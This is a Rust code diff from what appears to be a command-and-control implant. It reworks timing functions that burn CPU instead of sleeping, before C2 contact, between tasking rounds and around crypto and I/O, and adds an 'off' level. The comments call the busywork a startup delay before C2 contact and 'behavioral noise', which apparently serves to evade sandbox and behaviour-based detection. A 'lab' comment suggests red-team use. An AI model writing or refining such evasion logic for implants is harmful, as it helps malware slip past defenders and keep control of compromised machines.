@@ -2,55 +2,102 @@ use std::hint::black_box;
 use crate::config;
 use busywork::{BusyWork, Intensity, FeedWork};
 
-fn intensity() -> Intensity {
+/// Parsed busywork level. `"off"` / `"none"` skips computational delay entirely.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Level {
+    Off,
+    Low,
+    Medium,
+    High,
+    Ultra,
+}
+
+fn level() -> Level {
     match config::busywork_intensity {
-        "low" => Intensity::Low,
-        "high" => Intensity::High,
-        "ultra" => Intensity::Ultra,
-        _ => Intensity::Medium,
+        "off" | "none" | "disabled" => Level::Off,
+        "low" => Level::Low,
+        "high" => Level::High,
+        "ultra" => Level::Ultra,
+        _ => Level::Medium,
     }
 }
 
+fn to_intensity(l: Level) -> Option<Intensity> {
+    match l {
+        Level::Off => None,
+        Level::Low => Some(Intensity::Low),
+        Level::Medium => Some(Intensity::Medium),
+        Level::High => Some(Intensity::High),
+        Level::Ultra => Some(Intensity::Ultra),
+    }
+}
+
+/// Startup delay before C2 contact. Uses the configured intensity (not hard-coded Ultra).
 pub fn startup_delay() {
+    let l = level();
+    crate::dlog!("startup_delay: intensity={:?}", config::busywork_intensity);
+    let Some(i) = to_intensity(l) else {
+        crate::dlog!("startup_delay: skipped (off)");
+        return;
+    };
     let uuid = config::UUID.read().unwrap();
     black_box(
-        BusyWork::new(Intensity::Ultra)
+        BusyWork::new(i)
             .feed(uuid.as_str())
             .feed(config::callback_host)
             .feed(config::user_agent)
-            .run()
+            .run(),
     );
+    crate::dlog!("startup_delay: done");
 }
 
+/// Sleep replacement between tasking rounds.
 pub fn idle() {
+    let l = level();
+    let Some(i) = to_intensity(l) else {
+        std::thread::sleep(std::time::Duration::from_millis(200));
+        return;
+    };
     let uuid = config::UUID.read().unwrap();
     black_box(
-        BusyWork::new(intensity())
+        BusyWork::new(i)
             .feed(uuid.as_str())
             .feed(config::callback_host)
-            .run()
+            .run(),
     );
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    std::thread::sleep(std::time::Duration::from_millis(200));
     black_box(
-        BusyWork::new(intensity())
+        BusyWork::new(i)
             .feed(config::user_agent)
             .feed(uuid.as_str())
-            .run()
+            .run(),
     );
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    // Cap the third burst at High so Medium/Low builds stay responsive in lab.
+    let third = match l {
+        Level::Ultra | Level::High => Intensity::High,
+        Level::Medium => Intensity::Medium,
+        Level::Low => Intensity::Low,
+        Level::Off => return,
+    };
+    std::thread::sleep(std::time::Duration::from_millis(200));
     black_box(
-        BusyWork::new(Intensity::High)
+        BusyWork::new(third)
             .feed(config::callback_host)
             .feed(config::user_agent)
             .feed(uuid.as_str())
-            .run()
+            .run(),
     );
 }
 
+/// Lightweight behavioral noise around crypto / I/O.
 pub fn churn(data: &(impl FeedWork + ?Sized)) {
-    black_box(
-        BusyWork::new(Intensity::Medium)
-            .feed(data)
-            .run()
-    );
+    let Some(i) = to_intensity(level()) else {
+        return;
+    };
+    // Never churn harder than Medium — high churn after every op starves tasking.
+    let i = match i {
+        Intensity::High | Intensity::Ultra => Intensity::Medium,
+        other => other,
+    };
+    black_box(BusyWork::new(i).feed(data).run());
 }
